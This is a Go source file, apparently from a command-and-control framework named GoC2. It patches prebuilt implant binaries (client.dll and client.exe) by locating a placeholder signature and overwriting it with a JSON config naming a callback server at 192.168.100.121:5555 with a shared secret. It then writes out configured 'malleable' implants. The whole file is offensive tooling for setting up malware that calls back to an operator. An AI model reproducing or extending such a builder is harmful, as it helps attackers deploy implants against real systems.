package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"

	"github.com/latortuga71/GoC2/internal/data"
)

func compareChunk(data1, sig []byte) bool {
	log.Println("Comparing chunks")
	if len(data1) != len(sig) {
		fmt.Printf("Not equal lengths")
		return false
	}
	for x := 0; x < len(sig); x++ {
		if data1[x] != sig[x] {
			return false
		}
	}
	return true
}

func findSignature(data, sig []byte) (offset int) {
	for x := 0; x < len(data); x++ {
		if data[x] == sig[0] && data[x+1] == sig[1] {
			if !compareChunk(data[x:x+len(sig)], sig) {
				log.Println(string(data[x : x+len(sig)]))
				continue
			} else {
				return x
			}
		}
	}
	return 0
}

func replaceSignature(data []byte, replacement []byte, offset int) {
	var x int
	log.Println(string(data[offset : offset+PatchLength]))
	if len(replacement) > PatchLength {
		log.Fatal("MAX 30 BYTES")
	}
	for x = 0; x < len(replacement); x++ {
		data[offset+x] = replacement[x]
	}
	for ; x < PatchLength; x++ {
		data[offset+x] = 0x00
	}
	log.Println(string(data[offset : offset+PatchLength]))
}

var Signature string = "TURTLEMALLEABLE"

const PatchLength = 500

func MultiplyString(s string, count int) string {
	var out string
	for x := 0; x < count; x++ {
		out += s
	}
	return out
}

func PatchStage1ConfigDLL() {
	b, err := ioutil.ReadFile("C:\\Users\\Christopher\\Desktop\\GoC2\\bin\\client.dll")
	if err != nil {
		log.Fatal(err)
	}
	// new config
	conf := data.Config{}
	conf.ServerHostName = "192.168.100.121"
	conf.ServerPort = "5555"
	conf.ServerSecret = "test"
	stringConf, err := json.Marshal(conf)
	if err != nil {
		log.Fatal(err)
	}
	// find offset
	configOffset := findSignature(b, []byte(Signature))
	if configOffset == 0 {
		log.Fatal(fmt.Errorf("Failed to find signature %s", Signature))
	}
	replaceSignature(b, stringConf, configOffset)
	ioutil.WriteFile("C:\\tmp\\malleableclient.dll", b, 0644)
}

func PatchStage1Config() {
	b, err := ioutil.ReadFile("C:\\Users\\Christopher\\Desktop\\GoC2\\bin\\client.exe")
	if err != nil {
		log.Fatal(err)
	}
	// new config
	conf := data.Config{}
	conf.ServerHostName = "192.168.100.121"
	conf.ServerPort = "5555"
	conf.ServerSecret = "test"
	stringConf, err := json.Marshal(conf)
	if err != nil {
		log.Fatal(err)
	}
	// find offset
	configOffset := findSignature(b, []byte(Signature))
	if configOffset == 0 {
		log.Fatal(fmt.Errorf("Failed to find signature %s", Signature))
	}
	replaceSignature(b, stringConf, configOffset)
	ioutil.WriteFile("C:\\tmp\\malleableclient.exe", b, 0644)
}

func PatchStage0Config() {
	// patch stage zero PIC here. ?
	// probably just patch where stage 1 is located and user agent etc.
}

func main() {
	PatchStage1ConfigDLL()
	PatchStage1Config()
}
